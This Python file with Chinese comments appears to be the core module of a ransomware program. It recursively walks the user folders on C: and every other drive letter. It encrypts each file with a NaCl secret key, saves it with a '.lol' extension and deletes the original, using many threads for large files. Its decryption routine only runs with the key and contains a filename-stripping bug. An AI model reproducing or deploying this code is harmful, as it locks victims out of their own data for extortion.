#!/usr/bin/python3
# -*- coding: UTF-8 -*-
"""
@brief: 与加密和解密相关的函数
"""

"""限制 import * 可以引入的函数"""
__all__ = ['CallMsgBox', 'En_De_cryptFile']


"""一种密码算法库，主要功能有：对称加密、非对称加密、数字签名、随机数生成"""
from nacl.secret import SecretBox # 对称加密
"""GUI 界面"""
import tkinter
from tkinter import messagebox # 这是 Tkinter 的一个子模块，一定要单独导入
"""与操作系统相关"""
import os, pathlib, sys, threading
from time import sleep



"""这部分参数，你可以根据自己的需求来修改"""
# 目录白名单（跳过哪些目录，不进行加密）
g_dir_skip = ["$Recycle.Bin", "Windows", "AppData", "System32"]
# 文件后缀白名单（跳过哪些种类的文件，不进行加密）
g_type_skip = [".dll", ".exe", ".msn", ".DAT", "key", "Bg.png", ".py"]
# 运行此脚本时，最多允许创建多少个线程
g_max_thread = 120



"""解密密钥是否有效"""
g_flag_key_valid = False


"""
弹窗提醒
@param type: 
	1 - 弹出一个错误对话框
	2 - 弹出一个普通的信息提示框
"""
def CallMsgBox(type, title, content):
	# 创建一个根窗口
	WINDOW = tkinter.Tk()
	# 将根窗口隐藏起来
	WINDOW.withdraw()
	
	# 向用户显示内容
	if type == 1:
		messagebox.showerror(title, content)
	elif type == 2:
		messagebox.showinfo(title, content)

	# 销毁根窗口
	WINDOW.destroy()


"""
返回一个列表，包含了将要加密的硬盘分区有哪些
对于 C 盘，只加密 C:/Users/ 里面的文件，其他的目录都跳过
"""
def CreatePathList():
	li = [r"c:\Users\\"]
	for latter in range(97,123):
		li.append(f"{chr(latter)}:\\")
	li.remove("c:\\")
	return li


"""对单个文件执行加密工作"""
def PerformEncryption(file_path, file_name, secret_box):
	global g_type_skip

	# 跳过一些指定的文件格式
	for i in g_type_skip:
		if i in file_name:
			return
	try:
		# 读取文件里面的内容（基于二进制的读取）
		with open(file_path, "rb") as file_handle:
			file_content = file_handle.read()
		# 加密
		encrypt_content = secret_box.encrypt(file_content)
		# 写入被加密的内容
		with open(f"{file_path}.lol","wb") as file_handle:
			file_handle.write(encrypt_content)
		# 删除原文件
		os.remove(file_path)
	except: pass


"""对单个文件执行解密工作"""
def PerformDecryption(file_path, file_name, secret_box):
	global g_flag_key_valid

	if ".lol" in file_name:
		try:
			# 读取文件里面的内容（基于二进制的读取）
			with open(file_path, "rb") as file_handle:
				file_content = file_handle.read()
			# 解密
			encrypt_content = secret_box.decrypt(file_content)
			# 写入被解密的内容
			with open(file_path.strip(".lol"), "wb") as file_handle:
				file_handle.write(encrypt_content)
			# 删除原文件
			os.remove(file_path)

			# 只要能成功读写一次，就代表解密密钥是有效的
			g_flag_key_valid = True
		except: pass


"""
判断一个文件是否应该被加密或解密，以及是否需要创建线程
@param en_de_flag: 
	1 - 表示进行加密
	2 - 表示进行解密
"""
def En_De_cryptFile(en_de_flag, key_val):
	global g_dir_skip, g_max_thread
	# 记录创建过的线程
	thr_obj = None
	thr_list = []
	# 硬盘的路径有哪些
	path_list = CreatePathList()
	# 加密解密的对象
	secret_box = SecretBox(key_val)
	# 应该执行加密函数还是解密函数
	func = None

	# 加密
	if en_de_flag == 1: func = PerformEncryption
	# 解密
	elif en_de_flag == 2: func = PerformDecryption
	else: return

	try:
		# 遍历每个硬盘分区
		for all_files in path_list:

			# 如果一个分区在目标电脑上真实存在
			if( pathlib.Path(all_files).exists() ):
				
				# 遍历一个分区中的所有子目录
				for dir, subdirs, files in os.walk(all_files):
					
					# 跳过一些指定的目录
					for i in g_dir_skip:
						if i in dir:
							break
					else:
						# 遍历一个子目录中的所有文件
						for file_name in files:
							# 防止把自己给加密了
							if file_name in sys.argv[0]: continue

							# 将文件路径与文件名拼接起来
							file_path = os.path.join(dir, file_name)
							
							# 如果文件太大，则创建一个线程，由子线程负责处理加密工作
							if(os.stat(file_path).st_size >= 50000000 ):
								while True:
									# 如果现有的线程数量没有达到阈值
									if( len(threading.enumerate()) < g_max_thread ):
										thr_obj = threading.Thread(target=func, args=(file_path, file_name, secret_box,))
										thr_obj.start()
										thr_list.append(thr_obj)
										break
									else: sleep(0.2)
							else:
								func(file_path, file_name, secret_box)
		
		# 等待所有子线程结束
		for i in thr_list: i.join()
		return g_flag_key_valid
	
	except: pass
